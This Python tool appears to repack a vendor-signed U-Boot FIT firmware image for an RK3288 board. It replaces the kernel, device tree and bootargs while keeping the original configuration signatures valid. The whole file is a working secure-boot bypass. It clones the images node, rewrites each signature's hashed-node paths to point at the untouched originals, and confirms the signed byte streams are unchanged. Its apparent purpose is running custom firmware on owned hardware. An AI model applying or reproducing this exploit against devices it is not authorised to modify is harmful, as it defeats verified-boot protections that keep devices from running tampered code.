#!/usr/bin/env python3
"""Replace kernel, board DTB and bootargs in an external-data vendor FIT.

Uses the bundled clone/digest primitives. Keeps all original external data and
checks every configuration signature's byte stream before writing anything.
This is not a signature generator or proof of hardware bootability.
"""
import argparse
import gzip
import hashlib
from pathlib import Path
import struct
import sys

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / 'vendor/tamper'))
from build_attack_fit import (find_subtree, hashed_stream, parse_header,
                              prop_name, serialize, tokenize, u32)


class Fit:
    def __init__(self, data):
        self.data = data
        self.header = h = parse_header(data)
        self.strings = data[h['off_strings']:h['off_strings'] + h['sz_strings']]
        self.tokens = tokenize(data[h['off_struct']:h['off_struct'] + h['sz_struct']])

    def properties(self, path):
        start, end = find_subtree(self.tokens, path)
        depth = 0
        props = {}
        for i in range(start + 1, end):
            tag, value = self.tokens[i]
            if tag == 'BEGIN':
                depth += 1
            elif tag == 'END':
                depth -= 1
            elif tag == 'PROP' and depth == 0:
                props[prop_name(self.strings, value[0])] = (i, value[2])
        return props

    def get(self, path, name):
        return self.properties(path)[name][1]

    def text(self, path, name):
        return self.get(path, name).rstrip(b'\0').decode()

    def set(self, path, name, data):
        index, _ = self.properties(path)[name]
        old = self.tokens[index][1]
        self.tokens[index] = ('PROP', (old[0], len(data), data, b'\0' * (-len(data) % 4)))

    def payload(self, name):
        props = self.properties('/images/' + name)
        if 'data' in props:
            payload = props['data'][1]
        else:
            size = struct.unpack('>I', props['data-size'][1])[0]
            if 'data-offset' in props:
                pos = self.header['totalsize'] + struct.unpack('>I', props['data-offset'][1])[0]
            else:
                pos = struct.unpack('>I', props['data-position'][1])[0]
            if pos + size > len(self.data):
                raise ValueError('payload outside FIT: ' + name)
            payload = self.data[pos:pos + size]
        hash_path = '/images/' + name + '/hash-1'
        if self.text(hash_path, 'algo') != 'sha256':
            raise ValueError('unsupported payload hash: ' + name)
        if self.get(hash_path, 'value') != hashlib.sha256(payload).digest():
            raise ValueError('payload SHA-256 mismatch: ' + name)
        return payload

    def signatures(self):
        paths, stack = [], []
        for tag, value in self.tokens:
            if tag == 'BEGIN':
                stack.append(value[0].decode())
                path = '/' + '/'.join(p for p in stack if p)
                if path.startswith('/configurations/') and stack[-1].startswith('signature'):
                    paths.append(path)
            elif tag == 'END':
                stack.pop()
        return paths

    def stream(self, path):
        nodes = self.get(path, 'hashed-nodes').rstrip(b'\0').decode().split('\0')
        strings = struct.unpack('>II', self.get(path, 'hashed-strings'))
        # The bundled replica supports the vendor's zero-offset string region.
        if strings[0] != 0:
            raise ValueError('unsupported hashed-strings offset')
        return hashed_stream(self.tokens, self.strings, nodes, strings)

    def encode(self, external):
        h = self.header
        block = serialize(self.tokens)
        strings_pos = h['off_struct'] + len(block)
        total = (strings_pos + len(self.strings) + 3) & ~3
        header = bytearray(self.data[:40])
        for offset, value in [(4, total), (12, strings_pos), (36, len(block))]:
            struct.pack_into('>I', header, offset, value)
        prefix = bytes(header) + self.data[40:h['off_struct']] + block + self.strings
        return prefix + b'\0' * (total - len(prefix)) + external


def repack(stock, custom, dtbo, board):
    conf = '/configurations/conf-' + board
    kernel = stock.text(conf, 'kernel')
    dtb = stock.text(conf, 'fdt')
    if custom.text(conf, 'kernel') != kernel or custom.text(conf, 'fdt') != dtb:
        raise ValueError('custom FIT board/image names do not match vendor FIT')
    if stock.text('/images/' + kernel, 'arch') != 'arm':
        raise ValueError('only the 32-bit ARM boot path is supported')
    if custom.text('/images/' + kernel, 'arch') != 'arm':
        raise ValueError('custom kernel is not ARM')
    if custom.text('/images/' + kernel, 'compression') != 'none':
        raise ValueError('custom FIT must contain an uncompressed zImage')
    if custom.text('/images/' + dtb, 'compression') != 'none':
        raise ValueError('custom DTB must be uncompressed')
    if stock.text('/images/' + dtb, 'compression') != 'none':
        raise ValueError('compressed vendor DTB is not supported')
    image = custom.payload(kernel)
    # Linux ARM zImage header, not an arbitrary bare-metal or 64-bit payload.
    if len(image) < 0x30 or struct.unpack_from('<I', image, 0x24)[0] != 0x016f2818:
        raise ValueError('custom kernel is not an ARM zImage')
    parse_header(custom.payload(dtb))
    compression = stock.text('/images/' + kernel, 'compression')
    if compression == 'gzip':
        image = gzip.compress(image, mtime=0)
    elif compression != 'none':
        raise ValueError('unsupported vendor kernel compression: ' + compression)
    replacements = {kernel: image, dtb: custom.payload(dtb), 'fdt-cmdline': dtbo}

    # Relative external offsets survive the growth of the FDT header; absolute
    # positions do not. Fail closed rather than silently losing another image.
    start, end = find_subtree(stock.tokens, '/images')
    if any(tag == 'BEGIN' and value[0] == b'images'
           for tag, value in stock.tokens[start + 1:end]):
        raise ValueError('vendor FIT already contains a clone; use the original firmware')
    for tag, value in stock.tokens[start:end]:
        if tag == 'PROP' and prop_name(stock.strings, value[0]) == 'data-position':
            raise ValueError('vendor FIT uses absolute data-position, unsupported')
    signatures = stock.signatures()
    if not signatures:
        raise ValueError('vendor FIT has no configuration signatures')
    baselines = {path: (stock.stream(path), stock.get(path, 'value')) for path in signatures}
    for path in signatures:
        nodes = stock.get(path, 'hashed-nodes').rstrip(b'\0').decode().split('\0')
        nodes = ['/images' + n if n.startswith('/images/') else n for n in nodes]
        stock.set(path, 'hashed-nodes', b''.join(n.encode() + b'\0' for n in nodes))

    start, end = find_subtree(stock.tokens, '/images')
    clone = stock.tokens[start:end + 1]
    # Close the walked region for signatures covering the last image (cmdline).
    description = stock.properties('/')['description'][0]
    nameoff = stock.tokens[description][1][0]
    empty = [('BEGIN', (b'EMPTYNO', b'')), ('PROP', (nameoff, 0, b'', b'')), ('END', None)]
    stock.tokens[end:end] = clone[:-1] + empty + clone[-1:]
    external = bytearray(stock.data[stock.header['totalsize']:])
    for name, payload in replacements.items():
        path = '/images/' + name
        external += b'\0' * (-len(external) % 4)
        stock.set(path, 'data-offset', u32(len(external)))
        stock.set(path, 'data-size', u32(len(payload)))
        if stock.text(path + '/hash-1', 'algo') != 'sha256':
            raise ValueError('unsupported payload hash: ' + name)
        stock.set(path + '/hash-1', 'value', hashlib.sha256(payload).digest())
        external += payload
    for path, (stream, signature) in baselines.items():
        if stock.stream(path) != stream or stock.get(path, 'value') != signature:
            raise ValueError('signature stream changed: ' + path)
        print('Identical signature stream: ' + path)
    return stock.encode(external)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('stock')
    parser.add_argument('output')
    parser.add_argument('custom', help='unsigned meta-az0x kernel.fit')
    parser.add_argument('dtbo', help='compiled bootargs overlay')
    parser.add_argument('--board', default='rk3288-az01-jc11s')
    args = parser.parse_args()
    try:
        result = repack(Fit(Path(args.stock).read_bytes()), Fit(Path(args.custom).read_bytes()),
                        Path(args.dtbo).read_bytes(), args.board)
        if Path(args.output).resolve() in {Path(args.stock).resolve(), Path(args.custom).resolve()}:
            raise ValueError('output must not overwrite either input FIT')
        Path(args.output).write_bytes(result)
    except (ValueError, KeyError, AssertionError, struct.error) as error:
        parser.exit(1, f'repack-fit: {error}\n')


if __name__ == '__main__':
    main()
